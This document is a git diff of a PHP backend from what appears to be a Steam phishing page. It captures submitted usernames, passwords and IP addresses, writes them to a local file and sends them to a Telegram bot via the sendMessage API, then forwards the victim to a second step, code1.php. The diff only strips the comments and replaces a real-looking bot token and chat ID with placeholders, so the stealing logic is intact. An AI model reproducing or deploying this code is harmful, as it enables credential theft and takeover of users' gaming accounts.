@@ -3,12 +3,12 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 $ip = $_SERVER['REMOTE_ADDR'];
 
-// 1. Сохраняем локально
+
 file_put_contents("usernames.txt", "Steam Username: $username | Pass: $password | IP: $ip\n", FILE_APPEND);
 
-// 2. Отправляем в Telegram
-$botToken = "8415644431:AAEjoQoN5J-dgV4SwMQ1-WOxJxFiaSPpYAs";
-$chatId = "8145443779";
+
+$botToken = "TOKEN_BOT";
+$chatId = "ID TG";
 $message = "🔥 STEP 1 - LOGIN DATA\n👤: $username\n🔑: $password\n🌐 IP: $ip";
 
 $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
@@ -25,7 +25,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_exec($ch);
 curl_close($ch);
 
-// 3. ПЕРЕХОДИМ НА CODE1.PHP ВМЕСТО РЕДИРЕКТА НА ОСНОВНОЙ САЙТ
+
 ?>
 <form id="redirectForm" action="code1.php" method="post">
     <input type="hidden" name="username" value="<?= htmlspecialchars($username) ?>">
